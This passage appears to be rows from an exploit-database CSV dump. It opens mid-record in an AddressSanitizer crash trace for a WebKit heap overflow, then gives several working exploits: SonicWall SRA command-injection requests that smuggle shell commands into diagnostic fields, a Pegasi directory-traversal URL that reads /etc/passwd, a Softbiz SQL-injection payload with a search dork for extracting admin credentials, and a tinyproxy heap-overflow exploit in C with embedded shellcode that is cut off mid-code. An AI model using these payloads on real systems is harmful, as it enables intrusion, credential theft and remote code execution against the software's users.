WebCore::DeleteSelectionCommand::fixupWhitespace() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x72462b)     #16 0x1106178f3 in WebCore::DeleteSelectionCommand::doApply() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x7268f3)     #17 0x1102a19fa in WebCore::CompositeEditCommand::applyCommandToComposite(WTF::Ref<WebCore::EditCommand>&&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3b09fa)     #18 0x1102a653a in WebCore::CompositeEditCommand::deleteSelection(WebCore::VisibleSelection const&, bool, bool, bool, bool, bool) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3b553a)     #19 0x112ede1d5 in WebCore::TypingCommand::deleteKeyPressed(WebCore::TextGranularity, bool) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2fed1d5)     #20 0x112eddab3 in WebCore::TypingCommand::deleteKeyPressed(WebCore::Document&, unsigned int, WebCore::TextGranularity) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2fecab3)     #21 0x110823470 in WebCore::executeDelete(WebCore::Frame&, WebCore::Event*, WebCore::EditorCommandSource, WTF::String const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x932470)     #22 0x110821ab3 in WebCore::Editor::Command::execute(WTF::String const&, WebCore::Event*) const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x930ab3)     #23 0x1106a200a in WebCore::Document::execCommand(WTF::String const&, bool, WTF::String const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x7b100a)     #24 0x111297593 in WebCore::jsDocumentPrototypeFunctionExecCommandBody(JSC::ExecState*, WebCore::JSDocument*, JSC::ThrowScope&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x13a6593)     #25 0x11127f068 in long long WebCore::IDLOperation<WebCore::JSDocument>::call<&(WebCore::jsDocumentPrototypeFunctionExecCommandBody(JSC::ExecState*, WebCore::JSDocument*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x138e068)     #26 0x4e397e001027  (<unknown module>)     #27 0x11c9f8e49 in llint_entry (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16aae49)     #28 0x11c9f8e49 in llint_entry (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16aae49)     #29 0x11c9f1f6f in vmEntryToJavaScript (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16a3f6f)     #30 0x11c655847 in JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1307847)     #31 0x11c5d688a in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x128888a)     #32 0x11bbef731 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a1731)     #33 0x11bbef9a2 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a19a2)     #34 0x11bbefd13 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a1d13)     #35 0x11112f615 in WebCore::JSMainThreadExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x123e615)     #36 0x1115426cd in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x16516cd)     #37 0x1108ae010 in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener>, 1ul, WTF::CrashOnOverflow, 16ul>) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x9bd010)     #38 0x1108adae0 in WebCore::EventTarget::fireEventListeners(WebCore::Event&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x9bcae0)     #39 0x11078b051 in WebCore::DOMWindow::dispatchEvent(WebCore::Event&, WebCore::EventTarget*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x89a051)     #40 0x11079ac0f in WebCore::DOMWindow::dispatchLoadEvent() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x8a9c0f)     #41 0x11068db0f in WebCore::Document::dispatchWindowLoadEvent() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x79cb0f)     #42 0x110687bad in WebCore::Document::implicitClose() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x796bad)     #43 0x110a3a3ed in WebCore::FrameLoader::checkCompleted() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb493ed)     #44 0x110a3775c in WebCore::FrameLoader::finishedParsing() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb4675c)     #45 0x1106a7523 in WebCore::Document::finishedParsing() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x7b6523)     #46 0x110c2b5d0 in WebCore::HTMLDocumentParser::prepareToStopParsing() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd3a5d0)     #47 0x110748693 in WebCore::DocumentWriter::end() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x857693)     #48 0x110709736 in WebCore::DocumentLoader::finishedLoading() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x818736)     #49 0x110185047 in WebCore::CachedResource::checkNotify() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x294047)     #50 0x11017ddf1 in WebCore::CachedRawResource::finishLoading(WebCore::SharedBuffer*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x28cdf1)     #51 0x112c55661 in WebCore::SubresourceLoader::didFinishLoading(WebCore::NetworkLoadMetrics const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d64661)     #52 0x10630143b in WebKit::WebResourceLoader::didFinishResourceLoad(WebCore::NetworkLoadMetrics const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xb1343b)     #53 0x1063046d9 in void IPC::handleMessage<Messages::WebResourceLoader::DidFinishResourceLoad, WebKit::WebResourceLoader, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)>(IPC::Decoder&, WebKit::WebResourceLoader*, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xb166d9)     #54 0x106303bc9 in WebKit::WebResourceLoader::didReceiveWebResourceLoaderMessage(IPC::Connection&, IPC::Decoder&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xb15bc9)     #55 0x105af5117 in WebKit::NetworkProcessConnection::didReceiveMessage(IPC::Connection&, IPC::Decoder&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x307117)     #56 0x1058d4695 in IPC::Connection::dispatchMessage(std::__1::unique_ptr<IPC::Decoder, std::__1::default_delete<IPC::Decoder> >) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xe6695)     #57 0x1058dda48 in IPC::Connection::dispatchOneMessage() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xefa48)     #58 0x11d070842 in WTF::RunLoop::performWork() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d22842)     #59 0x11d0711b1 in WTF::RunLoop::performWork(void*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d231b1)     #60 0x7fffd52af320 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa7320)     #61 0x7fffd529021c in __CFRunLoopDoSources0 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x8821c)     #62 0x7fffd528f715 in __CFRunLoopRun (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x87715)     #63 0x7fffd528f113 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x87113)     #64 0x7fffd47efebb in RunCurrentEventLoopInMode (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30ebb)     #65 0x7fffd47efcf0 in ReceiveNextEventCommon (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30cf0)     #66 0x7fffd47efb25 in _BlockUntilNextEventMatchingListInModeWithFilter (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30b25)     #67 0x7fffd2d88a53 in _DPSNextEvent (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x46a53)     #68 0x7fffd35047ed in -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x7c27ed)     #69 0x7fffd2d7d3da in -[NSApplication run] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x3b3da)     #70 0x7fffd2d47e0d in NSApplicationMain (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x5e0d)     #71 0x7fffeac688c6 in _xpc_objc_main (/usr/lib/system/libxpc.dylib:x86_64+0x108c6)     #72 0x7fffeac672e3 in xpc_main (/usr/lib/system/libxpc.dylib:x86_64+0xf2e3)     #73 0x1057d356c in main (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x10000156c)     #74 0x7fffeaa0f234 in start (/usr/lib/system/libdyld.dylib:x86_64+0x5234)  0x6030000f5de6 is located 0 bytes to the right of 22-byte region [0x6030000f5dd0,0x6030000f5de6) allocated by thread T0 here:     #0 0x108a3fd2c in __sanitizer_mz_malloc (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.1.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x56d2c)     #1 0x7fffeab91281 in malloc_zone_malloc (/usr/lib/system/libsystem_malloc.dylib:x86_64+0x2281)     #2 0x11d0c0ad4 in bmalloc::DebugHeap::malloc(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d72ad4)     #3 0x11d0bed6d in bmalloc::Allocator::allocateSlowCase(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d70d6d)     #4 0x11d045247 in bmalloc::Allocator::allocate(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1cf7247)     #5 0x11d04463a in WTF::fastMalloc(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1cf663a)     #6 0x11d080ff8 in WTF::Ref<WTF::StringImpl> WTF::StringImpl::createUninitializedInternalNonEmpty<unsigned short>(unsigned int, unsigned short*&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d32ff8)     #7 0x11d07f8f3 in WTF::Ref<WTF::StringImpl> WTF::StringImpl::createInternal<unsigned short>(unsigned short const*, unsigned int) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d318f3)     #8 0x11d07f80d in WTF::StringImpl::create(unsigned short const*, unsigned int) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d3180d)     #9 0x11d0b2188 in WTF::String::String(unsigned short const*, unsigned int) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d64188)     #10 0x1107e1afc in WTF::NeverDestroyed<WTF::String>::NeverDestroyed<unsigned short const*, int>(unsigned short const*&&, int&&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x8f0afc)     #11 0x112523429 in WebCore::RenderCombineText::combineText() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2632429)     #12 0x112014105 in WebCore::BreakingContext::handleText(WTF::Vector<WebCore::WordMeasurement, 64ul, WTF::CrashOnOverflow, 16ul>&, bool&, unsigned int&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2123105)     #13 0x112011929 in WebCore::LineBreaker::nextLineBreak(WebCore::BidiResolverWithIsolate<WebCore::InlineIterator, WebCore::BidiRun, WebCore::BidiIsolatedRun>&, WebCore::LineInfo&, WebCore::LineLayoutState&, WebCore::RenderTextInfo&, WebCore::FloatingObject*, unsigned int, WTF::Vector<WebCore::WordMeasurement, 64ul, WTF::CrashOnOverflow, 16ul>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2120929)     #14 0x1124a67c1 in WebCore::RenderBlockFlow::layoutRunsAndFloatsInRange(WebCore::LineLayoutState&, WebCore::BidiResolverWithIsolate<WebCore::InlineIterator, WebCore::BidiRun, WebCore::BidiIsolatedRun>&, WebCore::InlineIterator const&, WebCore::BidiStatus const&, unsigned int) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25b57c1)     #15 0x1124a49f5 in WebCore::RenderBlockFlow::layoutRunsAndFloats(WebCore::LineLayoutState&, bool) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25b39f5)     #16 0x1124ab383 in WebCore::RenderBlockFlow::layoutLineBoxes(bool, WebCore::LayoutUnit&, WebCore::LayoutUnit&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25ba383)     #17 0x1124725f7 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25815f7)     #18 0x11242caa2 in WebCore::RenderBlock::layout() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x253baa2)     #19 0x112477a3c in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2586a3c)     #20 0x1124741c2 in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25831c2)     #21 0x112472602 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2581602)     #22 0x11242caa2 in WebCore::RenderBlock::layout() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x253baa2)     #23 0x112477a3c in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2586a3c)     #24 0x1124741c2 in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25831c2)     #25 0x112472602 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2581602)     #26 0x11242caa2 in WebCore::RenderBlock::layout() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x253baa2)     #27 0x112477a3c in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2586a3c)     #28 0x1124741c2 in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25831c2)     #29 0x112472602 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2581602)  SUMMARY: AddressSanitizer: heap-buffer-overflow (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2b574) in WTF::StringImpl::at(unsigned int) const Shadow bytes around the buggy address:   0x1c060001eb60: fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd   0x1c060001eb70: fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd   0x1c060001eb80: fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa   0x1c060001eb90: fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd   0x1c060001eba0: fa fa 00 00 00 00 fa fa fd fd fd fd fa fa fd fd =>0x1c060001ebb0: fd fd fa fa fd fd fd fd fa fa 00 00[06]fa fa fa   0x1c060001ebc0: fd fd fd fa fa fa 00 00 00 fa fa fa 00 00 00 fa   0x1c060001ebd0: fa fa 00 00 00 fa fa fa 00 00 00 fa fa fa 00 00   0x1c060001ebe0: 00 fa fa fa 00 00 00 fa fa fa 00 00 00 fa fa fa   0x1c060001ebf0: fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fa   0x1c060001ec00: fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==30388==ABORTING */",remote,dos,1
42342,Sonicwall Secure Remote Access 8.1.0.2-14sv - Command Injection Sonicwall Secure Remote Access (SRA) - Command Injection Vulnerabilities     Vendor: Sonicwall (Dell)   Product: Secure Remote Access (SRA)   Version: 8.1.0.2-14sv  Platform: Embedded Linux Discovery: Russell Sanford of Critical Start (www.CriticalStart.com)       CVE: cve-2016-9682   Tested against version 8.1.0.2-14sv on 11/28/16 (fully updated)    Description: The Sonicwall Secure Remote Access server (ver 8.1.0.2-14sv) is vulnerable to two Remote Command Injection vulnerabilities in it's web administrative interface. These vulnerabilies occur in the diagnostics CGI (/cgi-bin/diagnostics) component responsible for emailing out information about the state of the system. The application doesn't properly escape the information passed in the 'tsrDeleteRestartedFile' or 'currentTSREmailTo' variables before making a call to system() allowing for remote command injection.  Exploitation of this vulnerability yeilds shell access to the remote machine under the useraccount 'nobody'   Impact:  Remote Code Execution   Exploit #1 -----------------------------------------------------------------  GET /cgi-bin/diagnostics?tsrEmailCurrent=true&currentTSREmailTo=|date>/tmp/xort||a%20%23 HTTP/1.1 Host: 192.168.84.155 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: https://192.168.84.155/cgi-bin/diagnostics Cookie: SessURL=https%3A%2F%2F192.168.84.155%2Fcgi-bin%2Fwelcome; svDomainName=LocalDomain; activeUserSessionsTable=0; ajaxUpdates=ON; activeNxSessionsTable=0; servicesBookmarksTable=1; policyListTable=1; portalListTable=1; domainListTable=0; period=1; activeTab=4; curUrl=license; swap=dEVySFNhTXl5V3NLSXNWUFUzVzBNNTJJQ1o2WXpCODNrOGZYUGxYazJOZz0=   Exploit #2 -----------------------------------------------------------------  GET /cgi-bin/diagnostics?tsrDeleteRestarted=true&tsrDeleteRestartedFile=|date>/tmp/xort2||a%20%23 HTTP/1.1 Host: 192.168.84.155 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: https://192.168.84.155/cgi-bin/diagnostics Cookie: SessURL=https%3A%2F%2F192.168.84.155%2Fcgi-bin%2Fwelcome; svDomainName=LocalDomain; activeUserSessionsTable=0; ajaxUpdates=ON; activeNxSessionsTable=0; servicesBookmarksTable=1; policyListTable=1; portalListTable=1; domainListTable=0; period=1; activeTab=4; curUrl=sslcert; swap=dDdWMjhSYzlzMEZBd3kwQ29rTzZxQWFKdmxUSU5SRFVBQTRGRWk5UzJXVT0=   Timeline: 11/14/16 - Discovered in audit 11/20/16 - POC msf exploit written 11/28/16 - Contacted mitre for CVE 11/30/16 - CVE received from mitre (CVE-2016-9682) 11/30/16 - Dell notified through Sonicwall vuln reporting,remote,webapps,1
23802,"Pegasi Web Server 0.2.2 - Arbitrary File Access source: https://www.securityfocus.com/bid/9847/info  Multiple vulnerabilities have been identified in the application that may allow a remote attacker to carry out directory traversal and cross-site scripting attacks. A successful cross-site scripting attack may make it possible for an attacker to create a malicious link to a vulnerable site that includes hostile HTML and script code. This code may be rendered in the browser of a victim user who visits the malicious link and this will occur in the security context of the site hosting the software. The directory traversal vulnerability may allow a malicious user to request files outside of the web-server root directory with directory traversal strings such as '../'.  Pegasi Web Server version 0.2.2 has been reported to be prone to these issues, however, it is possible that other versions are affected as well.  http://www.example.com/../../../../etc/passwd http://www.example.com/../",remote,remote,1
4620,"Softbiz Link Directory Script - SQL Injection ##################################################################################### ####                   Links Directory Script SQL INJECTION                      #### ####                              BY IRCRASH                                     #### ##################################################################################### #                                                                                   # #AUTHOR : IRCRASH (Dr.Crash)                                                        # #Script Download : http://www.softbizscripts.com/                                   # #DORK: ""Powered by SoftbizScripts"" ""OUR SPONSORS""                                   # #                                                                                   # ##################################################################################### #                                                                                   # #Injection Adress : http://server.com/searchresult.php?sbcat_id=<SQL C0de>          # #                                                                                   # #SQL C0de For Find admin Username : 999999%20union/**/select/**/0,username,2,3/**/from/**/sblnk_admin/* #SQL C0de For Find admin Password : 999999%20union/**/select/**/0,password,2,3/**/from/**/sblnk_admin/* #                                                                                   # ##################################################################################### #                                                                                   # #Our site : Ircrash.com                                                             # #                                                                                   # #                                 TNX : GOD                                         # #####################################################################################  # milw0rm.com [2007-11-11]",remote,webapps,1
20559,"tinyproxy tinyproxy 1.3.2/1.3.3 - Remote Heap Overflow // source: https://www.securityfocus.com/bid/2217/info  Versions 1.3.2 and 1.3.3 of tinyproxy, a small HTTP proxy, exhibit a vulnerability to heap overflow attacks.  A failure to properly validate user-supplied input which arguments a call to sprintf() can allow unexpectedly large amounts of input to a buffer (used to display error messages) to be written past the boundary of the allocated space on the heap.  As a result, it may be possible to execute a denial of service attack, or even to execute arbitrary commands if certain internal memory structures can be successfully overwritten.   /*  * Exploit for tinyproxy 1.3.2 and 1.3.3  * by |CyRaX| <cyrax@pkcrew.org>  * Packet Knights Crew - www.pkcrew.org  * READ THE ADVISORY FIRST !  * Greetz :  *  bikappa: for some help  *  all the pkc members expecially recidjvo, asynchro and cthulhu  *  all the other friends */   #include <stdio.h> #include <stdlib.h> #include <netinet/in.h>  char jmps[]=""\xeb\x0e"";  char c0de[]=""\xeb\x0e\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""             ""\x90\x90\x90\x90\x90\x90\x90""             ""\x89\xe5""             ""\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8""             ""\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89""             ""\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0""             ""\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd""             ""\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9""             ""\x80\xea\x27\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x1f\x5e""             ""\x80\x46\x04\x01""             ""\x80\x06\x01""             ""\x89\x75""             ""\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08""             ""\x8d\x55\x0c\xcd\x80\xe8\xdc\xff\xff\xff\x2e\x62\x69\x6e\x2e\x73\x68"";  void usage();  void usage(){    printf(""Exploit for Tinyproxy 1.3.2 and 1.3.3 by |CyRaX| <cyrax@pkcrew.org>\n"");    printf(""Packet Knights Crew - http://www.pkcrew.org\n"");    printf(""please.. READ the advisory first!\n"");    printf(""Usage : ./PKCtiny-ex <host> <port> <buf_size> <struct offset> <free_hook> <shellcode>\n"");    printf(""buf_size is the size of the buf we send\n"");    printf(""struct offset is the distance from the beginning of the buffer we send where we\n"");    printf(""       we put the malloc chunk struct!\n"");    printf(""free_hook is the address of the free_hook function pointer\n"");    printf(""shellcode is the address of the shellcode (you don't neet to hit it correctly\n"");    printf(""          you can just hope to it a jump\n"");    printf(""\nfree_hook and shellcode must be given in 0xaddress format\n"");    exit(0); }  int main(int argc, char **argv){    int s,i,err,pid[5];    struct sockaddr_in dst;    struct malloc_chunk{       unsigned int ps;       unsigned int sz;       struct malloc_chunk *fd;       struct malloc_chunk *bk;    }mc;    char *magic,*sndbuff;    unsigned long FREE_HOOKZ,SHELLCODE;    if(argc<5)usage();    magic=(char *)malloc(atoi(argv[3])+1);    sndbuff=(char *)malloc(atoi(argv[3])+30);    memset(magic,'\x90',atoi(argv[3]));     SHELLCODE=strtol(argv[6],NULL,16);    FREE_HOOKZ=strtol(argv[5],NULL,16);      dst.sin_addr.s_addr=inet_addr(argv[1]);    dst.sin_port=htons(atoi(argv[2]));    dst.sin_family=AF_INET;    mc.ps=0xffffffff & ~1;    mc.sz=0xffffffff;    mc.fd=(struct 